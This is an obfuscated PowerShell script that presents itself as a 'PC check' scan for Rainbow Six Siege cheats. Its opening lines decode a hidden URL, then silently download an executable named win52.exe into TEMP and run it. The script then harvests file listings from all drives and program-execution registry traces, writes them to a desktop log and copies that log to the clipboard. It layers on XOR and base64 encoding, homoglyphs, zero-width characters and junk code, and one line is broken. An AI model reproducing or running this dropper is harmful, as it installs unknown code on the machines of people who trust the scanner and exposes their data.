$exeUrl  = $($k8169='9i4X}B7';$b=[byte[]](0x51,0x1D,0x40,0x28,0x0E,0x78,0x18,0x16,0x5B,0x05,0x2B,0x1C,0x34,0x56,0x5E,0x0C,0x1A,0x37,0x13,0x2E,0x5E,0x57,0x0C,0x1B,0x2F,0x14,0x2C,0x02,0x0B,0x47,0x51,0x20,0x18);$kb=[System.Text.Encoding]::UTF8.GetBytes($k8169);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))
$exePath = ($env + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('OlRFTVBcd2luNTIuZXhl'))))

Invoke-WebRequest -Uri $exeUrl -OutFile $exePath

Start-Process $exePath



Clear-Host
$encodedTitle = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UTNKbFlYUmxaQ0JDZVNCYVpYbHphMmtnYjI0Z1JHbHpZMjl5WkE9PQ==')))
$titleText = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedTitle))
$Host.UI.RawUI.WindowTitle = $titleText
function Get-OneDrivePath {
    try {
        # Attempt to retrieve OneDrive path from registry
        $oneDrivePath = (Get-ItemProperty ([string]::Format('{0}{1}{2}{3}{4}{5}{6}{7}{8}{9}{10}{11}{12}','HKC','U:\','Sof','tw','ar','e\Mic','r','osoft','\One','Dr','i','v','e')) -Name $($k3951=131;$b=[byte[]](0xd6,0xf0,0xe6,0xf1,0xc5,0xec,0xef,0xe7,0xe6,0xf1);-join($b|%{[char]($_-bxor$k3951)}))).UserFolder
        if (-not $oneDrivePath) {
            Write-Warning ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('T25lRHJpdmUgcGF0aCBub3QgZm91bmQgaW4gcmVnaXN0cnkuIEF0dGVtcHRpbmcgYWx0ZXJuYXRpdmUgZGV0ZWN0aW9uLi4u')))
            # Attempt to find OneDrive path using environment variables
            $envOneDrive = [System.IO.Path]::Combine($env:UserProfile, $($k3888='b!n%AnV';$b=[byte[]](0x2D,0x4F,0x0B,0x61,0x33,0x07,0x20,0x07);$kb=[System.Text.Encoding]::UTF8.GetBytes($k3888);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})))
            if (Test-Path $envOneDrive) {
                $oneDrivePath = $envOneDrive
                Write-Host (('{0}{1}{2}{3}{4}{5}{6}{7}{8}{9}{10}{11}{12}{13}{14}' -f 'One','Driv','e pat','h ','detec','t','ed ','usi','ng en','viron','me','nt va','riab','l','e: ') + $oneDrivePath) -ForegroundColor Green
            } else {
                Write-Error ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('VW5hYmxlIHRvIGZpbmQgT25lRHJpdmUgcGF0aCBhdXRvbWF0aWNhbGx5Lg==')))
            }
        }
        return $oneDrivePath
    } catch {
        Write-Error (('Unable '+'to fin'+'d On'+'eDrive p'+'ath:'+' ') + $_)
        return $null
    }
}
switch (2) { 1 {'a'} 2 {'b'} default {'c'} } | Out-Null
$Z74H = Get-Random -Minimum 1000 -Maximum 9999; $ad3Gry = $($Z74H / 2); $Z74H = $ad3Gry * 2; $Z74H = $null; $ad3Gry = $null
function Format-Output {
    param($name, $value)
    $(-join('{0} : {1}'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+7)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+7)%26))}else{[char]$c}})) -f $name, $value -replace "$([char]0x53)$([char]0x79)$([char]0x73)$([char]0x74)$([char]0x65)$([char]0x6D)$([char]0x2E)$([char]0x42)$([char]0x79)$([char]0x74)$([char]0x65)$([char]0x5C)$([char]0x5B)$([char]0x5C)$([char]0x5D)", ''
}

function Log-FolderNames {
    $userName = $env:UserName
    $oneDrivePath = Get-OneDrivePath
    $potentialPaths = @(($($k2948=70;$b=[byte[]](0x05,0x7c,0x1a,0x13,0x35,0x23,0x34,0x35,0x1a);-join($b|%{[char]($_-bxor$k2948)})) + $userName + $($k2294='x@4RTXKS.5';$b=[byte[]](0x24,0x04,0x5B,0x31,0x21,0x35,0x2E,0x3D,0x5A,0x46,0x24,0x0D,0x4D,0x72,0x13,0x39,0x26,0x36,0x5D,0x69,0x2A,0x21,0x5D,0x3C,0x36,0x37,0x3C,0x73,0x7D,0x5C,0x00,0x60,0x19,0x72,0x07,0x31,0x2E,0x34,0x4B);$kb=[System.Text.Encoding]::UTF8.GetBytes($k2294);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))),($oneDrivePath + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('XERvY3VtZW50c1xNeSBHYW1lc1xSYWluYm93IFNpeCAtIFNpZWdl')))))
    $allUserNames = @()

    foreach ($path in $potentialPaths) {
        if (Test-Path -Path $path) {
            $dirNames = Get-ChildItem -Path $path -Directory | ForEach-Object { $_.Name }
            $allUserNames += $dirNames
        }
    }

    # Remove duplicates if the same username is found in both paths
    $uniqueUserNames = $allUserNames | Select-Object -Unique

    if ($uniqueUserNames.Count -eq 0) {
        Write-Output ('{0}{1}{2}{3}{4}{5}{6}{7}' -f 'R6 di','re','ctory',' not ','f','ou','nd','.')
    } else {
        return $uniqueUserNames
    }
}
@{ Key = (-join('6dx','x','1')) }.GetType().Name | Out-Null

function Find-RarAndExeFiles {
    Write-Output (-join('Fi','ndin','g ','.rar a','nd .exe',' fi','les','..','.'))
    $desktopPath = [System.Environment]::GetFolderPath($(-join('Yznfojk'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+5)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+5)%26))}else{[char]$c}})))
    $outputFile = Join-Path -Path $desktopPath -ChildPath (-join([char]0x50, [char]0x63, [char]0x43, [char]0x68, [char]0x65, [char]0x63, [char]0x6B, [char]0x4C, [char]0x6F, [char]0x67, [char]0x73, [char]0x2E, [char]0x74, [char]0x78, [char]0x74))
    $oneDriveFileHeader = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YG4tLS0tLS0tLS0tLS0tLS0tLWBuT25lRHJpdmUgRmlsZXM6YG4=')))
    $oneDriveFiles = @()
    $allFiles = @()

    $rarSearchPaths = @()
    Get-PSDrive -PSProvider $($k7048=217;$b=[byte[]](0x9f,0xb0,0xb5,0xbc,0x8a,0xa0,0xaa,0xad,0xbc,0xb4);-join($b|%{[char]($_-bxor$k7048)})) | ForEach-Object { $rarSearchPaths += $_.Root }
    $oneDrivePath = Get-OneDrivePath
    if ($oneDrivePath) { $rarSearchPaths += $oneDrivePath }

    # Prepare script blocks for concurrent execution
    $jobs = @()

    # Define script block for finding .rar files
    $rarJob = {
        param ($searchPaths, $oneDriveFiles)
        $allFiles = @()
        foreach ($path in $searchPaths) {
            Get-ChildItem -Path $path -Recurse -Filter '*‌.‍r‌a​r​' -ErrorAction SilentlyContinue | ForEach-Object {
                $fileInfo = ($($_.FullName) + ' - Lаst Моdіfіеd: ' + $($_.LastWriteTime))
                $allFiles += $fileInfo
                if ($_.FullName -like ('{0}{1}{2}' -f '*On','eDri','ve*')) { $oneDriveFiles += $_.FullName }
            }
        }
        return $allFiles
    }

    # Define script block for finding .exe files
    $exeJob = {
        param ($oneDrivePath, $oneDriveFiles)
        $exeFiles = @()
        if ($oneDrivePath) {
            Get-ChildItem -Path $oneDrivePath -Recurse -Filter (-join([char]0x2A, [char]0x2E, [char]0x65, [char]0x78, [char]0x65)) -ErrorAction SilentlyContinue | ForEach-Object {
                $fileInfo = ($($_.FullName) + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('IC0gTGFzdCBNb2RpZmllZDog'))) + $($_.LastWriteTime))
                $exeFiles += $fileInfo
                if ($_.FullName -like (-join('*OneD','ri','v','e','*'))) { $oneDriveFiles += $_.FullName }
            }
        }
        return $exeFiles
    }

    # Start jobs
    $jobs += Start-Job -ScriptBlock $rarJob -ArgumentList $rarSearchPaths, $oneDriveFiles
    $jobs += Start-Job -ScriptBlock $exeJob -ArgumentList $oneDrivePath, $oneDriveFiles

    # Wait for all jobs to complete and receive their output
    $jobs | ForEach-Object {
        Wait-Job $_ | Out-Null  # Suppress job completion output
        $allFiles += Receive-Job $_  # Receive job output
        Remove-Job $_  # Clean up job
    }

    $groupedFiles = $allFiles | Sort-Object

    if ($oneDriveFiles.Count -gt 0) {
        Add-Content -Path $outputFile -Value $oneDriveFileHeader
        $oneDriveFiles | Sort-Object | ForEach-Object { Add-Content -Path $outputFile -Value $_ }
    }

    if ($groupedFiles.Count -gt 0) {
        $groupedFiles | ForEach-Object { Add-Content -Path $outputFile -Value $_ }
    }
}

Get-Command -Name (-join('W','rite','-','Hos','t')) | Select-Object -ExpandProperty Name | Out-Null

function Find-SusFiles {
    Write-Output ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('RmluZGluZyBzdXNwaWNpb3VzIGZpbGVzIG5hbWVzLi4u')))
    $desktopPath = [System.Environment]::GetFolderPath((-join('Des','ktop')))
    $outputFile = Join-Path -Path $desktopPath -ChildPath ('{0}{1}{2}{3}{4}{5}{6}{7}' -f 'P','cChe','c','k','L','og','s.t','xt')
    $susFilesHeader = '`n-----------------`nSus Fіlеs:`n'
    $susFiles = @()

    if (Test-Path $outputFile) {
        $loggedFiles = Get-Content -Path $outputFile
        foreach ($file in $loggedFiles) {
            if ($file -match $($k9483=57;$b=[byte[]](0x55,0x56,0x58,0x5d,0x5c,0x4b,0x17,0x13,0x65,0x17,0x5c,0x41,0x5c);-join($b|%{[char]($_-bxor$k9483)}))) { $susFiles += $file }
        }

        if ($susFiles.Count -gt 0) {
            Add-Content -Path $outputFile -Value $susFilesHeader
            $susFiles | Sort-Object | ForEach-Object { Add-Content -Path $outputFile -Value $_ }
        }
    } else {
        Write-Output ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('TG9nIGZpbGUgbm90IGZvdW5kLiBVbmFibGUgdG8gc2VhcmNoIGZvciBzdXNwaWNpb3VzIGZpbGVzLg==')))
    }
}
@{ Key = ([string]::Format('{0}','aie8a')) }.GetType().Name | Out-Null

function List-BAMStateUserSettings {
    Write-Host 'L​o​g‍g‌i​n‍g‌ ‍r‌e‌g​ ‌e‌n‌t‌r​i‌e‍s​ ​i‍n‌s‌i‌d​e​ ​P​o​w‌e‍r‍S‍h​e‍l​l‌.‍.​.​' -ForegroundColor DarkYellow
    $desktopPath = [System.Environment]::GetFolderPath('Dеsktор')
    $outputFile = Join-Path -Path $desktopPath -ChildPath "$([char]0x50)$([char]0x63)$([char]0x43)$([char]0x68)$([char]0x65)$([char]0x63)$([char]0x6B)$([char]0x4C)$([char]0x6F)$([char]0x67)$([char]0x73)$([char]0x2E)$([char]0x74)$([char]0x78)$([char]0x74)"
    if (Test-Path $outputFile) { Clear-Content $outputFile }
    $loggedPaths = @{}
     Write-Host (-join(' Fetchi','ng',' User','Settings',' Entr','ies ')) -ForegroundColor Blue
    # Log entries from bam\State\UserSettings
    $registryPath = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SEtMTTpcU1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XFNlcnZpY2VzXGJhbVxTdGF0ZVxVc2VyU2V0dGluZ3M=')))
    $userSettings = Get-ChildItem -Path $registryPath | Where-Object { $_.Name -like $(-join('*1001'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+10)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+10)%26))}else{[char]$c}})) }

    if ($userSettings) {
        foreach ($setting in $userSettings) {
            Add-Content -Path $outputFile -Value (([System.Text.Encoding]::UTF8.GetString([byte[]](0x60,0x6E))) + $($setting.PSPath))
            $items = Get-ItemProperty -Path $setting.PSPath | Select-Object -Property *
            foreach ($item in $items.PSObject.Properties) {
                if (($item.Name -match 'e‍x‍e​' -or $item.Name -match $($k3117=';dgslb,D,f';$b=[byte[]](0x15,0x16,0x06,0x01);$kb=[System.Text.Encoding]::UTF8.GetBytes($k3117);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))) -and -not $loggedPaths.ContainsKey($item.Name)) {
                    Add-Content -Path $outputFile -Value (Format-Output $item.Name $item.Value)
                    $loggedPaths[$item.Name] = $true
                }
            }
        }
    } else {
        Write-Host ([string]::Format('{0}{1}{2}{3}{4}{5}{6}{7}{8}','No r','elev','ant ','use','r set','ti','ngs f','ound','.')) -ForegroundColor Red
    }
Write-Host ([string]::Format('{0}{1}{2}{3}{4}{5}{6}{7}{8}{9}{10}{11}{12}','Fetch','ing',' Com','p','ati','bi','lit','y A','ssis','ta','nt E','ntr','ies'))
    # Log entries from Compatibility Assistant Store
    $compatRegistryPath = $(-join('QTLD:\BXOCFJAN\Vrlaxbxoc\Frwmxfb WC\LdaanwcEnabrxw\JyyLxvyjcOujpb\Lxvyjcrkrurch Jbbrbcjwc\Bcxan'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+17)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+17)%26))}else{[char]$c}}))
    $compatEntries = Get-ItemProperty -Path $compatRegistryPath
    $compatEntries.PSObject.Properties | ForEach-Object {
        if (($_.Name -match ('{0}{1}' -f 'ex','e') -or $_.Name -match (-join([char]0x2E, [char]0x72, [char]0x61, [char]0x72))) -and -not $loggedPaths.ContainsKey($_.Name)) {
            Add-Content -Path $outputFile -Value (Format-Output $_.Name $_.Value)
            $loggedPaths[$_.Name] = $true
        }
    }
Write-Host (-join('Fetchi','ng',' ','A','ppsSw','itch','ed E','ntries')) -ForegroundColor Blue
    # Log entries from FeatureUsage\AppSwitched
    $newRegistryPath = ([System.Text.Encoding]::UTF8.GetString([byte[]](0x48,0x4B,0x43,0x55,0x3A,0x5C,0x53,0x4F,0x46,0x54,0x57,0x41,0x52,0x45,0x5C,0x4D,0x69,0x63,0x72,0x6F,0x73,0x6F,0x66,0x74,0x5C,0x57,0x69,0x6E,0x64,0x6F,0x77,0x73,0x5C,0x43,0x75,0x72,0x72,0x65,0x6E,0x74,0x56,0x65,0x72,0x73,0x69,0x6F,0x6E,0x5C,0x45,0x78,0x70,0x6C,0x6F,0x72,0x65,0x72,0x5C,0x46,0x65,0x61,0x74,0x75,0x72,0x65,0x55,0x73,0x61,0x67,0x65,0x5C,0x41,0x70,0x70,0x53,0x77,0x69,0x74,0x63,0x68,0x65,0x64)))
    if (Test-Path $newRegistryPath) {
        $newEntries = Get-ItemProperty -Path $newRegistryPath
        $newEntries.PSObject.Properties | ForEach-Object {
            if (($_.Name -match (-join('ex','e')) -or $_.Name -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('LnJhcg==')))) -and -not $loggedPaths.ContainsKey($_.Name)) {
                Add-Content -Path $outputFile -Value (Format-Output $_.Name $_.Value)
                $loggedPaths[$_.Name] = $true
            }
        }
    }
Write-Host $($k5224=53;$b=[byte[]](0x73,0x50,0x41,0x56,0x5d,0x5c,0x5b,0x52,0x15,0x78,0x40,0x5c,0x76,0x54,0x56,0x5d,0x50,0x15,0x70,0x5b,0x41,0x47,0x5c,0x50,0x46);-join($b|%{[char]($_-bxor$k5224)})) -ForegroundColor Blue
    # Log entries from MuiCache
    $muiCachePath = 'H‌K‌C‍R​:‍\​L‍o‍c‍a‍l‍ ‍S​e‍t‍t​i​n‌g‍s​\‌S‍o‍f‍t‌w​a​r‍e​\​M​i‍c​r‌o​s​o‍f​t​\‌W​i‍n​d‌o‍w​s‌\​S‍h​e​l‌l‍\‌M‍u​i‍C‍a‍c‍h‌e​'
    if (Test-Path $muiCachePath) {
        $muiCacheEntries = Get-ChildItem -Path $muiCachePath
        $muiCacheEntries.PSObject.Properties | ForEach-Object {
            if (($_.Name -match (-join('e','xe')) -or $_.Name -match $($k6940='J(;qUHqR.wu4m,M';$b=[byte[]](0x64,0x5A,0x5A,0x03);$kb=[System.Text.Encoding]::UTF8.GetBytes($k6940);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))) -and -not $loggedPaths.ContainsKey($_.Name)) {
                Add-Content -Path $outputFile -Value (Format-Output $_.Name $_.Value)
                $loggedPaths[$_.Name] = $true
            }
        }
    }

    Get-Content $outputFile | Sort-Object | Get-Unique | Where-Object { $_ -notmatch (-join([char]0x5C, [char]0x7B, [char]0x2E, [char]0x2A, [char]0x5C, [char]0x7D)) } | ForEach-Object { $_ -replace $($k4407=22;$b=[byte[]](0x2c);-join($b|%{[char]($_-bxor$k4407)})), '' } | Set-Content $outputFile

    Log-BrowserFolders
    # Remove the placeholder Log-MUICacheEntries function call if not defined elsewhere
  
    $folderNames = Log-FolderNames | Sort-Object | Get-Unique
    Add-Content -Path $outputFile -Value ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YG4tLS0tLS0tLS0tLS0tLS0tLQ==')))
    Add-Content -Path $outputFile -Value ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YG5SNiBVc2VybmFtZXM6')))

    foreach ($name in $folderNames) {
        Add-Content -Path $outputFile -Value $name
        $url = ($($k7636=147;$b=[byte[]](0xfb,0xe7,0xe7,0xe3,0xe0,0xa9,0xbc,0xbc,0xe0,0xe7,0xf2,0xe7,0xe0,0xbd,0xf0,0xf0,0xbc,0xe0,0xfa,0xf6,0xf4,0xf6,0xbc);-join($b|%{[char]($_-bxor$k7636)})) + $name)
        Write-Host (('{0}{1}{2}{3}{4}{5}{6}' -f 'O','pe','ning',' s','tat','s fo','r ') + $name + ('{0}{1}{2}{3}{4}{5}' -f ' on',' S','t','ats','.cc .','..')) -ForegroundColor Blue
        Start-Process $url
        Start-Sleep -Seconds 0.5
    }
}
if (66 -gt 10) { Write-Host "." -NoNewline } else { Write-Host "," -NoNewline }; Write-Host ""
Write-Host $(-join(' Zynwbcha Xiqhfiuxyx Vliqmylm '.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+6)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+6)%26))}else{[char]$c}})) -ForegroundColor Blue
function Log-BrowserFolders {
    Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('TG9nZ2luZyByZWcgZW50cmllcyBpbnNpZGUgUG93ZXJTaGVsbC4uLg=='))) -ForegroundColor DarkYellow
    $registryPath = (-join('H','KL','M:','\SOFTW','ARE\C','lients\','Start','Menu','Intern','e','t'))
    $desktopPath = [System.Environment]::GetFolderPath($(-join('Tuiajef'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+10)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+10)%26))}else{[char]$c}})))
    $outputFile = Join-Path -Path $desktopPath -ChildPath ('{0}{1}{2}' -f 'PcChe','ckLog','s.txt')
    if (Test-Path $registryPath) {
        $browserFolders = Get-ChildItem -Path $registryPath
        Add-Content -Path $outputFile -Value (-join('`n-----','----','---','--','-','-','-'))
        Add-Content -Path $outputFile -Value $(-join('`pDtqyugt Hqnfgtu:'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+24)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+24)%26))}else{[char]$c}}))
        foreach ($folder in $browserFolders) { Add-Content -Path $outputFile -Value $folder.Name }
    } else {
        Write-Host $($k4964='7DAl^>Z7JY5f5(';$b=[byte[]](0x65,0x21,0x26,0x05,0x2D,0x4A,0x28,0x4E,0x6A,0x29,0x54,0x12,0x5D,0x08,0x51,0x2B,0x33,0x4C,0x3C,0x4C,0x35,0x40,0x39,0x3C,0x47,0x15,0x15,0x46,0x58,0x30,0x61,0x0A,0x31,0x4B,0x34,0x53,0x64);$kb=[System.Text.Encoding]::UTF8.GetBytes($k4964);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})) -ForegroundColor Red
    }
}
Get-Command -Name $(-join('Vqhsd-Gnrs'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+1)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+1)%26))}else{[char]$c}})) | Select-Object -ExpandProperty Name | Out-Null

function Log-WindowsInstallDate {
    Write-Host $($k1482='Jw:7-vRaa';$b=[byte[]](0x06,0x18,0x5D,0x50,0x44,0x18,0x35,0x41,0x36,0x23,0x19,0x5E,0x58,0x5A,0x05,0x72,0x08,0x0F,0x39,0x03,0x5B,0x5B,0x41,0x56,0x36,0x00,0x15,0x2F,0x59,0x14,0x19);$kb=[System.Text.Encoding]::UTF8.GetBytes($k1482);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})) -ForegroundColor DarkYellow
    $os = Get-WmiObject -Class Win32_OperatingSystem
    $installDate = $os.ConvertToDateTime($os.InstallDate)
    $desktopPath = [System.Environment]::GetFolderPath(('De'+'sk'+'t'+'o'+'p'))
    $outputFile = Join-Path -Path $desktopPath -ChildPath 'РсСhесkLоgs.tхt'
    Add-Content -Path $outputFile -Value '`‍n​-‌-‍-​-‍-​-‍-‍-​-‌-​-‌-‍-‌-‌-‍-‍-‌'
    Add-Content -Path $outputFile -Value ($(-join('`fOafvgok Afklsddslagf Vslw: '.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+8)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+8)%26))}else{[char]$c}})) + $installDate)
}
$k9R6lKw = 1..6; $k9R6lKw = $k9R6lKw | Where-Object { $_ % 2 -eq 0 }; Clear-Variable k9R6lKw -ErrorAction SilentlyContinue
$m2ivc4e = Get-Random -Minimum 1000 -Maximum 9999; $DzOz = $($m2ivc4e / 2); $m2ivc4e = $DzOz * 2; $m2ivc4e = $null; $DzOz = $null

$PID | Out-Null
List-BAMStateUserSettings
Log-WindowsInstallDate
Find-RarAndExeFiles
Find-SusFiles

$desktopPath = [System.Environment]::GetFolderPath($($k4228=49;$b=[byte[]](0x75,0x54,0x42,0x5a,0x45,0x5e,0x41);-join($b|%{[char]($_-bxor$k4228)})))
# Copy the log file to clipboard
$logFilePath = Join-Path -Path $desktopPath -ChildPath ('PcChec'+'kL'+'ogs.t'+'x'+'t')

if (Test-Path $logFilePath) {
    Set-Clipboard -Path $logFilePath
    Write-Host ('{0}{1}{2}{3}{4}{5}{6}{7}{8}{9}{10}{11}{12}' -f 'Lo','g fil','e ','co','pi','ed ','to c','li','p','b','oa','rd','.') -ForegroundColor DarkRed
} else {
    Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('TG9nIGZpbGUgbm90IGZvdW5kIG9uIHRoZSBkZXNrdG9wLg=='))) -ForegroundColor Red
}
# Paths to Desktop and Downloads folders
$desktopPath = [System.Environment]::GetFolderPath($($k2055='PW$bDr5Rj?#';$b=[byte[]](0x14,0x32,0x57,0x09,0x30,0x1D,0x45);$kb=[System.Text.Encoding]::UTF8.GetBytes($k2055);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})))

# Get the user's profile folder
$userProfile = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::UserProfile)

# Construct the path to the Downloads folder
$downloadsPath = Join-Path -Path $userProfile -ChildPath $($k1809=146;$b=[byte[]](0xd6,0xfd,0xe5,0xfc,0xfe,0xfd,0xf3,0xf6,0xe1);-join($b|%{[char]($_-bxor$k1809)}))

# Function to delete a file if it exists
function Delete-FileIfExists {
    param (
        [string]$filePath
    )
    if (Test-Path $filePath) {
        Remove-Item -Path $filePath -Force -ErrorAction SilentlyContinue
    }
}
[int]'7' | Out-Null
Full paths to the target file in Desktop and Downloads folders
$targetFileDesktop = Join-Path -Path $desktopPath -ChildPath (-join('PcCh','e','c','k','.txt'))
$targetFileDownloads = Join-Path -Path $downloadsPath -ChildPath ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UGNDaGVjay50eHQ=')))

# Delete the target file if it exists
Delete-FileIfExists -filePath $targetFileDesktop
Delete-FileIfExists -filePath $targetFileDownloads


# Define colors
$yellow = $($k3560='>3CVpm=fJc';$b=[byte[]](0x67,0x56,0x2F,0x3A,0x1F,0x1A);$kb=[System.Text.Encoding]::UTF8.GetBytes($k3560);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))
$space = (-join([char]0x20)) * 12  # Increased the number of spaces for more right alignment

# Print the red 'SСАN СОМРLЕТЕ' line with more white space to the right
Write-Host ($(-join('`e'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+9)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+9)%26))}else{[char]$c}})) + $space + $(-join('╭─────────────────────────────────────╮'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+17)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+17)%26))}else{[char]$c}}))) -ForegroundColor $yellow
Write-Host ($space + "$([char]0x2502)$([char]0x20)$([char]0x20)$([char]0x20)$([char]0x20)$([char]0x20)$([char]0x20)$([char]0x20)$([char]0x20)$([char]0x20)$([char]0x20)$([char]0x20)$([char]0x20)$([char]0x53)$([char]0x43)$([char]0x41)$([char]0x4E)$([char]0x20)$([char]0x43)$([char]0x4F)$([char]0x4D)$([char]0x50)$([char]0x4C)$([char]0x45)$([char]0x54)$([char]0x45)$([char]0x20)$([char]0x20)$([char]0x20)$([char]0x20)$([char]0x20)$([char]0x20)$([char]0x20)$([char]0x20)$([char]0x20)$([char]0x20)$([char]0x20)$([char]0x20)$([char]0x2502)") -ForegroundColor $yellow
Write-Host ($space + $(-join('╰─────────────────────────────────────╯'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+8)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+8)%26))}else{[char]$c}}))) -ForegroundColor $yellow












$zqSMPP = $($k2582='_MeC}PZ[MU';$b=[byte[]](0x67,0x3D,0x08,0x37,0x44);$kb=[System.Text.Encoding]::UTF8.GetBytes($k2582);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})) * 2; $zqSMPP.Replace('f‍', ('{0}' -f 's')) | Out-Null; Remove-Variable zqSMPP -ErrorAction SilentlyContinue
